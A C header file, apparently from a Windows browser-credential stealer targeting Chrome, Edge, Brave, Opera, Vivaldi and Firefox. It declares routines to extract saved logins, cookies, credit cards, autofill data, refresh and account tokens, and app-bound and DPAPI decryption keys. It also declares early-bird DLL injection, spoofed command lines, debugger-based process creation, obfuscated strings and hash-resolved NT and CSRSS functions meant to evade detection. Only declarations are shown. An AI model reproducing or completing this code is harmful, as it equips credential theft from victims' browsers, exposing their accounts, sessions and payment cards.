#pragma once
#ifndef EXE_HEADERS_H
#define EXE_HEADERS_H

#include "Structures.h"
#include "CsrssRegistration.h"
#include "Common.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define MAX_DISPLAY_COUNT               16                      // max to output if /all was not provided

#define INITIAL_ARRAY_CAPACITY          MAX_DISPLAY_COUNT       // the initial array length of each element. setting it to 'MAX_DISPLAY_COUNT' will avoid expanding the arrays if not using /all.

#define PIPE_THREAD_TIMEOUT             (1000 * 15)             // 15 seconds

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define STR_FIREFOX_PROGID              OBFW_S(L"FirefoxURL")
#define STR_FIREFOX_REGKEY              OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe")
#define STR_FIREFOX_OUTPUT_FILE         OBFA_S("FireFoxData.json")

#define STR_OPERA_PROGID                OBFW_S(L"OperaStable")
#define STR_OPERA_REGKEY                OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Opera.exe")
#define STR_OPERA_OUTPUT_FILE           OBFA_S("OperaData.json")

#define STR_OPERA_GX_PROGID             OBFW_S(L"OperaGXStable")
#define STR_OPERA_GX_REGKEY             OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Opera_GX.exe")
#define STR_OPERA_GX_OUTPUT_FILE        OBFA_S("OperaGxData.json")

#define STR_CHROME_PROGID               OBFW_S(L"ChromeHTML")
#define STR_CHROME_REGKEY               OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe")
#define STR_CHROME_OUTPUT_FILE          OBFA_S("ChromeData.json")

#define STR_EDGE_PROGID                 OBFW_S(L"MSEdgeHTM")
#define STR_EDGE_REGKEY                 OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe")
#define STR_EDGE_OUTPUT_FILE            OBFA_S("EdgeData.json")

#define STR_BRAVE_PROGID                OBFW_S(L"BraveHTML")
#define STR_BRAVE_REGKEY                OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe")
#define STR_BRAVE_OUTPUT_FILE           OBFA_S("BraveData.json")

#define STR_VIVALDI_PROGID              OBFW_S(L"VivaldiHTM")
#define STR_VIVALDI_REGKEY              OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\vivaldi.exe")
#define STR_VIVALDI_OUTPUT_FILE         OBFA_S("VivaldiData.json")

#define STR_CHROMIUM_ARGS               OBFW_S(L"--headless=new --disable-gpu --remote-debugging-port=9222 --disable-background-timer-throttling")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// Works For All Browsers
static inline LPCWSTR GetBrowserProgId(IN BROWSER_TYPE Browser)
{
    switch (Browser)
    {
        case BROWSER_CHROME:    return STR_CHROME_PROGID;
        case BROWSER_BRAVE:     return STR_BRAVE_PROGID;
        case BROWSER_EDGE:      return STR_EDGE_PROGID;
        case BROWSER_OPERA:     return STR_OPERA_PROGID;
        case BROWSER_OPERA_GX:  return STR_OPERA_GX_PROGID;
        case BROWSER_FIREFOX:   return STR_FIREFOX_PROGID;
        case BROWSER_VIVALDI:   return STR_VIVALDI_PROGID;
        default:                return NULL;
    }
}

// Works For All Browsers
static inline LPCWSTR GetBrowserRegKey(IN BROWSER_TYPE Browser)
{
    switch (Browser)
    {
        case BROWSER_CHROME:    return STR_CHROME_REGKEY;
        case BROWSER_BRAVE:     return STR_BRAVE_REGKEY;
        case BROWSER_EDGE:      return STR_EDGE_REGKEY;
        case BROWSER_OPERA:     return STR_OPERA_REGKEY;
        case BROWSER_OPERA_GX:  return STR_OPERA_GX_REGKEY;
        case BROWSER_FIREFOX:   return STR_FIREFOX_REGKEY;
        case BROWSER_VIVALDI:   return STR_VIVALDI_REGKEY;
        default:                return NULL;
    }
}

// Works For All Browsers
static inline LPCSTR GetBrowserOutputFile(IN BROWSER_TYPE Browser)
{
    switch (Browser)
    {
        case BROWSER_CHROME:    return STR_CHROME_OUTPUT_FILE;
        case BROWSER_BRAVE:     return STR_BRAVE_OUTPUT_FILE;
        case BROWSER_EDGE:      return STR_EDGE_OUTPUT_FILE;
        case BROWSER_OPERA:     return STR_OPERA_OUTPUT_FILE;
        case BROWSER_OPERA_GX:  return STR_OPERA_GX_OUTPUT_FILE;
        case BROWSER_FIREFOX:   return STR_FIREFOX_OUTPUT_FILE;
        case BROWSER_VIVALDI:   return STR_VIVALDI_OUTPUT_FILE;
        default:                return NULL;
    }
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _TOKEN_ENTRY
{
    LPSTR   pszService;
    PBYTE   pbToken;
    DWORD   dwTokenLen;
    PBYTE   pbBindKey;
    DWORD   dwBindKeyLen;
} TOKEN_ENTRY, *PTOKEN_ENTRY;

typedef struct _COOKIE_ENTRY
{
    LPSTR   pszHostKey;
    LPSTR   pszPath;
    LPSTR   pszName;
    INT64   llExpiresUtc;
    PBYTE   pbValue;
    DWORD   dwValueLen;
} COOKIE_ENTRY, *PCOOKIE_ENTRY;

typedef struct _LOGIN_ENTRY
{
    LPSTR   pszOriginUrl;
    LPSTR   pszActionUrl;
    LPSTR   pszUsername;
    PBYTE   pbPassword;
    DWORD   dwPasswordLen;
    INT64   llDateCreated;
    INT64   llDateLastUsed;
} LOGIN_ENTRY, *PLOGIN_ENTRY;

typedef struct _CREDIT_CARD_ENTRY
{
    LPSTR   pszNameOnCard;
    LPSTR   pszNickname;
    DWORD   dwExpirationMonth;
    DWORD   dwExpirationYear;
    INT64   llDateModified;
    PBYTE   pbCardNumber;
    DWORD   dwCardNumberLen;
} CREDIT_CARD_ENTRY, *PCREDIT_CARD_ENTRY;

typedef struct _AUTOFILL_ENTRY
{
    LPSTR   pszName;
    LPSTR   pszValue;
    INT64   llDateCreated;
    DWORD   dwCount;
} AUTOFILL_ENTRY, *PAUTOFILL_ENTRY;

typedef struct _HISTORY_ENTRY
{
    LPSTR   pszUrl;
    LPSTR   pszTitle;
    DWORD   dwVisitCount;
    INT64   llLastVisitTime;
} HISTORY_ENTRY, *PHISTORY_ENTRY;

typedef struct _BOOKMARK_ENTRY
{
    LPSTR   pszName;
    LPSTR   pszUrl;
    INT64   llDateAdded;
} BOOKMARK_ENTRY, *PBOOKMARK_ENTRY;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _FIREFOX_BROWSER_DATA
{
    PBYTE   pbMasterKey;
    DWORD   dwMasterKeyLen;
    LPSTR   szEmail;
    LPSTR   szUid;
    LPSTR   szSessionToken;
    LPSTR   szSyncOAuthToken;
    LPSTR   szProfileOAuthToken;
    LPSTR   szSendTabPrivateKey;
    LPSTR   szCloseTabPrivateKey;
    BOOL    bVerified;
} FIREFOX_BROWSER_DATA, * PFIREFOX_BROWSER_DATA;

typedef struct _CHROMIUM_DATA
{
    // App-Bound Key (V20)
    PBYTE                   pbAppBoundKey;
    DWORD                   dwAppBoundKeyLen;

    // DPAPI Key (V10)
    PBYTE                   pbDpapiKey;
    DWORD                   dwDpapiKeyLen;

    // Tokens
    PTOKEN_ENTRY            pTokens;
    DWORD                   dwTokenCount;
    DWORD                   dwTokenCapacity;

    // Cookies
    PCOOKIE_ENTRY           pCookies;
    DWORD                   dwCookieCount;
    DWORD                   dwCookieCapacity;

    // Logins
    PLOGIN_ENTRY            pLogins;
    DWORD                   dwLoginCount;
    DWORD                   dwLoginCapacity;

    // Credit Cards
    PCREDIT_CARD_ENTRY      pCreditCards;
    DWORD                   dwCreditCardCount;
    DWORD                   dwCreditCardCapacity;
    
    // Autofill
    PAUTOFILL_ENTRY         pAutofill;
    DWORD                   dwAutofillCount;
    DWORD                   dwAutofillCapacity;

    // History
    PHISTORY_ENTRY          pHistory;
    DWORD                   dwHistoryCount;
    DWORD                   dwHistoryCapacity;

    // Bookmarks
    PBOOKMARK_ENTRY         pBookmarks;
    DWORD                   dwBookmarkCount;
    DWORD                   dwBookmarkCapacity;

    // Firefox data ONLY
    PFIREFOX_BROWSER_DATA   pFireFoxBrsrData;

} CHROMIUM_DATA, *PCHROMIUM_DATA;


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

DWORD WINAPI HashStringFnv1aCharA(IN LPCSTR pszString, IN BOOL bCaseInsensitive);
DWORD WINAPI HashStringFnv1aCharW(IN LPCWSTR pwszString, IN BOOL bCaseInsensitive);


#define HASH_STRING_A(STR)       HashStringFnv1aCharA((LPCSTR)(STR), FALSE)
#define HASH_STRING_W(STR)       HashStringFnv1aCharW((LPCWSTR)(STR), FALSE)

#define HASH_STRING_A_CI(STR)    HashStringFnv1aCharA((LPCSTR)(STR), TRUE)
#define HASH_STRING_W_CI(STR)    HashStringFnv1aCharW((LPCWSTR)(STR), TRUE)


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Utilities Functions

VOID RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN LPWSTR SourceString);

LPWSTR GenerateFakeCommandLine(IN LPCWSTR szRealCommandLine, IN LPCWSTR szProcessPath);

BOOL NtReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID pBuffer, IN SIZE_T cbSize);

BOOL NtWriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, IN PVOID pBuffer, IN SIZE_T cbSize);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Chromium Process Creation

typedef struct _CREATED_PROCESS_PROPERTIES
{
    HANDLE hProcess;
    HANDLE hThread;
    DWORD  dwProcessId;
    DWORD  dwThreadId;
    DWORD  dwParentProcessId;
    HANDLE hDebugObject;

} CREATED_PROCESS_PROPERTIES, *PCREATED_PROCESS_PROPERTIES;

BOOL CreateChromiumProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szArguments, OUT CREATED_PROCESS_PROPERTIES* pProcessProp);

BOOL DetachDebugger(IN CREATED_PROCESS_PROPERTIES* pProcessProp);

BOOL NtCreateChromiumProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szArguments, IN OUT CREATED_PROCESS_PROPERTIES* pProcessProp);

BOOL NtDetachDebugger(IN CREATED_PROCESS_PROPERTIES* pProcessProp);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL GetBrowserPath(IN BROWSER_TYPE Browser, IN OUT LPWSTR szBrowserPath, IN DWORD dwSize);

BOOL InitializeChromiumData(IN OUT PCHROMIUM_DATA pChromiumData);

VOID FreeChromiumData(IN OUT PCHROMIUM_DATA pChromiumData);

BOOL InjectDllViaEarlyBird(IN BOOL bUseSpoofing, IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL AddTokenEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszService, IN PBYTE pbToken, IN DWORD dwTokenLen, IN PBYTE pbBindKey, IN DWORD dwBindKeyLen);

BOOL AddCookieEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszHostKey, IN LPCSTR pszPath, IN LPCSTR pszName, IN INT64 llExpiresUtc, IN PBYTE pbValue, IN DWORD dwValueLen);

BOOL AddLoginEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszOriginUrl, IN LPCSTR pszActionUrl, IN LPCSTR pszUsername, IN PBYTE pbPassword, IN DWORD dwPasswordLen, IN INT64 llDateCreated, IN INT64 llDateLastUsed);

BOOL AddCreditCardEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszNameOnCard, IN LPCSTR pszNickname, IN DWORD dwExpirationMonth, IN DWORD dwExpirationYear, IN INT64 llDateModified, IN PBYTE pbCardNumber, IN DWORD dwCardNumberLen);

BOOL AddAutofillEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszName, IN LPCSTR pszValue, IN INT64 llDateCreated, IN DWORD dwCount);

BOOL AddHistoryEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszUrl, IN LPCSTR pszTitle, IN DWORD dwVisitCount, IN INT64 llLastVisitTime);

BOOL AddBookmarkEntry(IN OUT PCHROMIUM_DATA pChromiumData, IN LPCSTR pszName, IN LPCSTR pszUrl, IN INT64 llDateAdded);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL ExtractBookmarksFromFile(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractHistoryFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractAutofillFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractCreditCardsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractLoginsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractCookiesFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractRefreshTokenFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractOperaAccessTokensFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Firefox [ONLY]

BOOL ExtractMasterKeyFromKey4Db(IN OPTIONAL LPCSTR pszMasterPassword, OUT PBYTE* ppbMasterKey, OUT PDWORD pcbMasterKey);

BOOL ExtractFirefoxLogins(IN PBYTE pbMasterKey, IN DWORD cbMasterKey, IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractFirefoxCookies(IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractFirefoxHistory(IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractFirefoxBookmarks(IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractFirefoxAutofill(IN OUT PCHROMIUM_DATA pChromiumData);

BOOL ExtractFirefoxAccountTokens(IN OUT PFIREFOX_BROWSER_DATA pFirefoxData);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL WriteChromiumDataToJson(IN PCHROMIUM_DATA pChromiumData, IN LPCSTR pszFilePath, IN BOOL bShowAll);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region HASH_VALUES

#define FNV1A_KERNEL32DLL                                    0xA3E6F6C3
#define FNV1A_NTDLLDLL                                       0xA62A3B3B

#define FNV1A_BASEPCONSTRUCTSXSCREATEPROCESSMESSAGE          0x98A84DB3
#define FNV1A_CSRCAPTUREMESSAGEMULTIUNICODESTRINGSINPLACE    0x58CC175A
#define FNV1A_CSRCLIENTCALLSERVER                            0x33C69D47
#define FNV1A_NTCREATEUSERPROCESS                            0x116893E9
#define FNV1A_RTLCREATEPROCESSPARAMETERSEX                   0x2DFC830F
#define FNV1A_RTLDESTROYPROCESSPARAMETERS                    0x552E48C2
#define FNV1A_NTCREATEDEBUGOBJECT                            0x22074A55
#define FNV1A_NTWAITFORDEBUGEVENT                            0xEECD8408
#define FNV1A_NTDEBUGCONTINUE                                0xED5F89F7
#define FNV1A_NTREMOVEPROCESSDEBUG                           0x81FB52CF
#define FNV1A_NTQUERYINFORMATIONPROCESS                      0xEA2DDA8A
#define FNV1A_NTREADVIRTUALMEMORY                            0x6E2A0391
#define FNV1A_NTWRITEVIRTUALMEMORY                           0x43E32F32
#define FNV1A_NTOPENPROCESSTOKEN                             0x1F1A92AD


#pragma endregion

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region CSRSS_FUNCTION_POINTERS

// Windows 10 2004+ / Windows 11 signature 
typedef NTSTATUS(NTAPI* fnBasepConstructSxsCreateProcessMessage)(
    IN      PUNICODE_STRING              NtPath,                    // a1
    IN      PUNICODE_STRING              Win32Path,                 // a2
    IN      HANDLE                       FileHandle,                // a3
    IN      HANDLE                       ProcessHandle,             // a4
    IN      HANDLE                       SectionHandle,             // a5
    IN      HANDLE                       TokenHandle,               // a6
    IN      ULONG                        SxsCreateFlag,             // a7 
    IN      PVOID                        UnknowCompatCache,         // a8
    IN      PVOID                        AppCompatSxsData,          // a9
    IN      ULONG                        AppCompatSxsDataSize,      // a10
    IN      ULONG                        NoIsolation,               // a11 
    IN      PVOID                        AppXPath,                  // a12
    IN      PPEB                         PebAddress,                // a13
    IN      PVOID                        ManifestAddress,           // a14
    IN      ULONG                        ManifestSize,              // a15
    IN OUT  PULONG                       CurrentParameterFlags,     // a16
    OUT     PBASE_SXS_CREATEPROCESS_MSG  SxsMessage,                // a17
    OUT     PVOID                        SxsUtilityStruct           // a18
);

typedef NTSTATUS(NTAPI* fnCsrCaptureMessageMultiUnicodeStringsInPlace)(
    IN OUT  PCSR_CAPTURE_BUFFER*         CaptureBuffer,
    IN      ULONG                        StringsCount,
    IN      PUNICODE_STRING*             MessageStrings
);

typedef NTSTATUS(NTAPI* fnCsrClientCallServer)(
    IN OUT  PCSR_API_MSG                 ApiMessage,
    IN OUT  PCSR_CAPTURE_BUFFER          CaptureBuffer OPTIONAL,
    IN      CSR_API_NUMBER               ApiNumber,
    IN      ULONG                        DataLength
);

#pragma endregion


#pragma region NT_FUNCTION_POINTERS

typedef NTSTATUS (NTAPI* fnNtCreateUserProcess)(
    OUT      PHANDLE                        ProcessHandle,
    OUT      PHANDLE                        ThreadHandle,
    IN       ACCESS_MASK                    ProcessDesiredAccess,
    IN       ACCESS_MASK                    ThreadDesiredAccess,
    IN       PCOBJECT_ATTRIBUTES            ProcessObjectAttributes OPTIONAL,
    IN       PCOBJECT_ATTRIBUTES            ThreadObjectAttributes OPTIONAL,
    IN       ULONG                          ProcessFlags, 
    IN       ULONG                          ThreadFlags,
    IN       PRTL_USER_PROCESS_PARAMETERS   ProcessParameters OPTIONAL,
    IN OUT   PPS_CREATE_INFO                CreateInfo,
    IN       PPS_ATTRIBUTE_LIST             AttributeList OPTIONAL
);

typedef NTSTATUS (NTAPI* fnRtlCreateProcessParametersEx)(
    OUT     PRTL_USER_PROCESS_PARAMETERS*   ProcessParameters,
    IN      PCUNICODE_STRING                ImagePathName,
    IN      PCUNICODE_STRING                DllPath OPTIONAL,
    IN      PCUNICODE_STRING                CurrentDirectory OPTIONAL,
    IN      PCUNICODE_STRING                CommandLine OPTIONAL,
    IN      PVOID                           Environment OPTIONAL,
    IN      PCUNICODE_STRING                WindowTitle OPTIONAL,
    IN      PCUNICODE_STRING                DesktopInfo OPTIONAL,
    IN      PCUNICODE_STRING                ShellInfo OPTIONAL,
    IN      PCUNICODE_STRING                RuntimeData OPTIONAL,
    IN      ULONG                           Flags
);

typedef NTSTATUS (NTAPI* fnRtlDestroyProcessParameters)(
    IN      PRTL_USER_PROCESS_PARAMETERS    ProcessParameters
);

typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess)(
    IN      HANDLE              ProcessHandle,
    IN      PROCESSINFOCLASS    ProcessInformationClass,
    OUT     PVOID               ProcessInformation,
    IN      ULONG               ProcessInformationLength,
    OUT     PULONG              ReturnLength OPTIONAL
);

typedef NTSTATUS (NTAPI* fnNtCreateDebugObject)(
    OUT     PHANDLE             DebugObjectHandle,
    IN      ACCESS_MASK         DesiredAccess,
    IN      POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
    IN      ULONG               Flags
);

typedef NTSTATUS (NTAPI* fnNtWaitForDebugEvent)(
    IN      HANDLE                      DebugObjectHandle,
    IN      BOOLEAN                     Alertable,
    IN      PLARGE_INTEGER              Timeout OPTIONAL,
    OUT     PDBGUI_WAIT_STATE_CHANGE    WaitStateChange
);

typedef NTSTATUS (NTAPI* fnNtDebugContinue)(
    IN      HANDLE      DebugObjectHandle,
    IN      PCLIENT_ID  ClientId,
    IN      NTSTATUS    ContinueStatus
);

typedef NTSTATUS (NTAPI* fnNtRemoveProcessDebug)(
    IN      HANDLE      ProcessHandle,
    IN      HANDLE      DebugObjectHandle
);

typedef NTSTATUS (NTAPI* fnNtReadVirtualMemory)(
    IN      HANDLE      ProcessHandle,
    IN      PVOID       BaseAddress OPTIONAL,
    OUT     PVOID       Buffer,
    IN      SIZE_T      NumberOfBytesToRead,
    OUT     PSIZE_T     NumberOfBytesRead OPTIONAL
);

typedef NTSTATUS (NTAPI* fnNtWriteVirtualMemory)(
    IN      HANDLE      ProcessHandle,
    IN      PVOID       BaseAddress OPTIONAL,
    IN      PVOID       Buffer,
    IN      SIZE_T      NumberOfBytesToWrite,
    OUT     PSIZE_T     NumberOfBytesWritten OPTIONAL
);

typedef NTSTATUS(NTAPI* fnNtOpenProcessToken)(
    IN  HANDLE      ProcessHandle,
    IN  ACCESS_MASK DesiredAccess,
    OUT PHANDLE     TokenHandle
);

#pragma endregion

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _DINMCLY_RSOLVD_FUNCTIONS
{
    PVOID                                           pInitialized;

    // NTAPI Functions
    fnNtCreateUserProcess                           pNtCreateUserProcess;
    fnRtlCreateProcessParametersEx                  pRtlCreateProcessParametersEx;
    fnRtlDestroyProcessParameters                   pRtlDestroyProcessParameters;
    fnNtCreateDebugObject                           pNtCreateDebugObject;
    fnNtWaitForDebugEvent                           pNtWaitForDebugEvent;
    fnNtDebugContinue                               pNtDebugContinue;
    fnNtRemoveProcessDebug                          pNtRemoveProcessDebug;
    fnNtQueryInformationProcess                     pNtQueryInformationProcess;
    fnNtReadVirtualMemory                           pNtReadVirtualMemory;
    fnNtWriteVirtualMemory                          pNtWriteVirtualMemory;
    fnNtOpenProcessToken                            pNtOpenProcessToken;

    // CRSS Functions
    fnBasepConstructSxsCreateProcessMessage         pBasepConstructSxsCreateProcessMessage;
    fnCsrCaptureMessageMultiUnicodeStringsInPlace   pCsrCaptureMessageMultiUnicodeStringsInPlace;
    fnCsrClientCallServer                           pCsrClientCallServer;


} DINMCLY_RSOLVD_FUNCTIONS, *PDINMCLY_RSOLVD_FUNCTIONS;


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


BOOL InitializeAllDynamicFunctions();




#endif // !EXE_HEADERS_H